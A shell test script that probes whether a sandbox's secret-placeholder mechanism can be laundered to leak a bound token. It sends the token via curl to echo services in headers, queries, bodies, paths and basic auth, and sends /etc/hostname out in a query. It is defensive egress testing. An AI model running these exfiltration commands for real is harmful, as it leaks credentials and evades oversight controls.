#!/bin/sh
# Exfil via ALLOWED endpoint + placeholder laundering. Runs INSIDE sandbox.
# Setup (run.sh): provider binds ECHO_TOKEN to httpbin.org/anything (echo service); postman-echo.com allowed, unbound.
# Usage: exfil.sh <secret-prefix>
S="$1"; rc=0
blocked() { n="$1"; shift; if sh -c "$1" >/dev/null 2>&1; then echo "FAIL $n"; rc=1; else echo "PASS $n"; fi; }
gap()     { n="$1"; ref="$2"; shift 2; if sh -c "$1" >/dev/null 2>&1; then echo "GAP  $n ($ref)"; else echo "PASS $n"; fi; }
L="grep -q $S"

blocked "launder:other-host-header" "curl -s --max-time 8 -H \"Authorization: Bearer \$ECHO_TOKEN\" https://postman-echo.com/get | $L"
blocked "launder:other-host-query"  "curl -s --max-time 8 \"https://postman-echo.com/get?t=\$ECHO_TOKEN\" | $L"
blocked "launder:body"              "curl -s --max-time 8 -X GET --data \"t=\$ECHO_TOKEN\" https://httpbin.org/anything | $L"
blocked "launder:path"              "curl -s --max-time 8 \"https://httpbin.org/anything/\$ECHO_TOKEN\" | $L"
gap "launder:query"        C17 "curl -s --max-time 8 \"https://httpbin.org/anything?t=\$ECHO_TOKEN\" | $L"
gap "launder:other-header" C17 "curl -s --max-time 8 -H \"X-Foo: \$ECHO_TOKEN\" https://httpbin.org/anything | $L"
gap "launder:basic-auth"   C17 "curl -s --max-time 8 -u \"x:\$ECHO_TOKEN\" https://httpbin.org/anything | grep -q $(printf 'x:%s' "$S" | base64 | cut -c1-12)"
gap "exfil:data-in-query"  C19 "curl -s --max-time 8 \"https://httpbin.org/anything?src=\$(head -c 40 /etc/hostname)\" | grep -q sandbox-"
exit $rc
